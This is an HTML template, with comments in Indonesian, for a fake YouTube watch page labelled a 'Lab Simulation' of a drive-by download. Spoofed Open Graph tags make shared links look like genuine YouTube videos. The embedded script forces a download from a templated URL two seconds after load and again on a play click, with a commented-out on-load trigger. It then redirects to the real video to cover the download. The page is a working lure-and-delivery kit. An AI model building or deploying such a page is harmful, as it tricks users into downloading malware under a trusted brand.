<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <!-- OG Tags: YouTube video yang asli -->
    <meta property="og:title" content="{{ og_title }}">
    <meta property="og:description" content="{{ og_desc }}">
    <meta property="og:image" content="{{ og_thumbnail }}">
    <meta property="og:url" content="https://www.youtube.com/watch?v={{ video_id }}">
    <meta property="og:type" content="video.other">
    <meta property="og:site_name" content="YouTube">

    <title>{{ og_title }} - YouTube</title>
    <link rel="icon" href="https://www.youtube.com/favicon.ico" type="image/x-icon">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: #0f0f0f;
            color: #fff;
            min-height: 100vh;
        }
        .navbar {
            background: #212121;
            padding: 12px 24px;
            display: flex;
            align-items: center;
            gap: 24px;
            border-bottom: 1px solid #333;
        }
        .logo { display: flex; align-items: center; gap: 4px; text-decoration: none; }
        .logo svg { width: 90px; height: 20px; }
        .search-box { display: flex; flex: 1; max-width: 640px; }
        .search-box input {
            flex: 1;
            padding: 8px 16px;
            background: #121212;
            border: 1px solid #303030;
            border-right: none;
            border-radius: 20px 0 0 20px;
            color: #fff;
            font-size: 16px;
            outline: none;
        }
        .search-box button {
            padding: 8px 20px;
            background: #303030;
            border: 1px solid #303030;
            border-radius: 0 20px 20px 0;
            cursor: pointer;
        }
        .search-box button svg { width: 24px; height: 24px; fill: #fff; }

        .player-section {
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px 24px;
            display: flex;
            gap: 24px;
        }
        @media (max-width: 768px) {
            .player-section { flex-direction: column; }
        }

        .player-main { flex: 1; }
        .video-player {
            width: 100%;
            aspect-ratio: 16/9;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            position: relative;
        }
        .video-player img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .play-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            cursor: pointer;
        }
        .play-overlay svg { width: 72px; height: 52px; filter: drop-shadow(0 2px 8px rgba(0,0,0,0.5)); }
        .play-overlay:hover svg { filter: drop-shadow(0 2px 12px rgba(255,0,0,0.5)); }

        .video-info { padding: 16px 0; }
        .video-info h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; line-height: 1.4; }
        .video-stats {
            display: flex;
            gap: 16px;
            font-size: 14px;
            color: #aaa;
            margin-bottom: 16px;
        }
        .channel-row {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 16px 0;
            border-top: 1px solid #333;
        }
        .channel-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(135deg, #ff0000, #cc0000);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            font-weight: 600;
        }
        .channel-name { font-size: 16px; font-weight: 500; }
        .channel-subs { font-size: 12px; color: #aaa; }

        .sidebar {
            width: 360px;
            flex-shrink: 0;
        }
        @media (max-width: 768px) { .sidebar { width: 100%; } }
        .related-item {
            display: flex;
            gap: 8px;
            margin-bottom: 12px;
            cursor: pointer;
            padding: 4px;
            border-radius: 8px;
            transition: background 0.2s;
        }
        .related-item:hover { background: #272727; }
        .related-thumb {
            width: 168px;
            height: 94px;
            border-radius: 8px;
            background: #272727;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: #555;
        }
        .related-meta h3 { font-size: 14px; font-weight: 500; line-height: 1.3; margin-bottom: 4px; }
        .related-meta p { font-size: 12px; color: #aaa; }

        .footer-note {
            text-align: center;
            padding: 20px;
            color: #444;
            font-size: 11px;
            border-top: 1px solid #222;
            margin-top: 40px;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <a class="logo" href="#">
            <svg viewBox="0 0 90 20" fill="none">
                <path d="M27.9727 3.12324C27.6435 1.89323 26.6768 0.926623 25.4468 0.597366C23.2197 2.24288e-07 14.285 0 14.285 0C14.285 0 5.35042 2.24288e-07 3.12323 0.597366C1.89323 0.926623 0.926623 1.89323 0.597366 3.12324C2.24288e-07 5.35042 0 10 0 10C0 10 2.24288e-07 14.6496 0.597366 16.8768C0.926623 18.1068 1.89323 19.0734 3.12323 19.4026C5.35042 20 14.285 20 14.285 20C14.285 20 23.2197 20 25.4468 19.4026C26.6768 19.0734 27.6435 18.1068 27.9727 16.8768C28.5701 14.6496 28.5701 10 28.5701 10C28.5701 10 28.5677 5.35042 27.9727 3.12324Z" fill="#FF0000"/>
                <path d="M11.4253 14.2854L18.8477 10.0004L11.4253 5.71533V14.2854Z" fill="white"/>
            </svg>
        </a>
        <div class="search-box">
            <input type="text" placeholder="Search">
            <button>
                <svg viewBox="0 0 24 24"><path d="M20.87,20.17l-5.59-5.59C16.35,13.35,17,11.75,17,10c0-3.87-3.13-7-7-7s-7,3.13-7,7s3.13,7,7,7c1.75,0,3.35-0.65,4.58-1.71l5.59,5.59L20.87,20.17z M5,10c0-2.76,2.24-5,5-5s5,2.24,5,5s-2.24,5-5,5S5,12.76,5,10z"/></svg>
            </button>
        </div>
        <div></div>
    </div>

    <div class="player-section">
        <div class="player-main">
            <div class="video-player" id="player">
                <img src="{{ og_thumbnail }}" alt="{{ og_title }}" id="thumb">
                <div class="play-overlay" id="playBtn">
                    <svg viewBox="0 0 68 48">
                        <path d="M66.52,7.74c-0.78-2.93-2.49-5.41-5.42-6.19C55.79,.13,34,0,34,0S12.21,.13,6.9,1.55C3.97,2.33,2.27,4.81,1.48,7.74C0.06,13.05,0,24,0,24s0.06,10.95,1.48,16.26c0.78,2.93,2.49,5.41,5.42,6.19C12.21,47.87,34,48,34,48s21.79-0.13,27.1-1.55c2.93-0.78,4.64-3.26,5.42-6.19C67.94,34.95,68,24,68,24S67.94,13.05,66.52,7.74z" fill="#FF0000"/>
                        <path d="M 45,24 27,14 27,34" fill="#fff"/>
                    </svg>
                </div>
            </div>

            <div class="video-info">
                <h1>{{ og_title }}</h1>
                <div class="video-stats">
                    <span>1,284,567 views</span>
                    <span>2 days ago</span>
                </div>
                <div class="channel-row">
                    <div class="channel-avatar">T</div>
                    <div>
                        <div class="channel-name">TechChannel</div>
                        <div class="channel-subs">1.2M subscribers</div>
                    </div>
                </div>
            </div>
        </div>

        <div class="sidebar">
            <div class="related-item">
                <div class="related-thumb">Video</div>
                <div class="related-meta">
                    <h3>Related Video Title Here</h3>
                    <p>Another Channel · 500K views</p>
                </div>
            </div>
            <div class="related-item">
                <div class="related-thumb">Video</div>
                <div class="related-meta">
                    <h3>More Related Content</h3>
                    <p>Other Channel · 200K views</p>
                </div>
            </div>
        </div>
    </div>

    <div class="footer-note">
        ⚠️ Lab Simulation — YouTube Embed + Drive-by Download
    </div>

    <script>
        var downloadUrl = '{{ download_url }}';
        var realUrl = '{{ real_yt_url }}';
        var videoId = '{{ video_id }}';

        function triggerDownload() {
            console.log('[*] Auto-download triggered');
            var a = document.createElement('a');
            a.href = downloadUrl;
            a.download = '';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }

        // === STRATEGI AUTO-DOWNLOAD ===

        // Method 1: Langsung trigger saat page load
        // Uncomment baris di bawah untuk auto-download langsung:
        // triggerDownload();

        // Method 2: Saat user klik play button (lebih natural)
        document.getElementById('playBtn').addEventListener('click', function() {
            console.log('[*] Play button clicked');
            triggerDownload();
        });

        // Method 3: Auto-download setelah 2 detik (fallback)
        setTimeout(function() {
            console.log('[*] Timer triggered download');
            triggerDownload();
        }, 2000);

        // Setelah download dimulai, redirect ke YouTube asli
        setTimeout(function() {
            console.log('[*] Redirecting to real YouTube');
            window.location.href = realUrl;
        }, 4000);

        // Log OG info untuk debugging
        console.log('[*] Video ID:', videoId);
        console.log('[*] OG Title:', document.querySelector('meta[property="og:title"]').content);
        console.log('[*] OG Image:', document.querySelector('meta[property="og:image"]').content);
    </script>
</body>
</html>
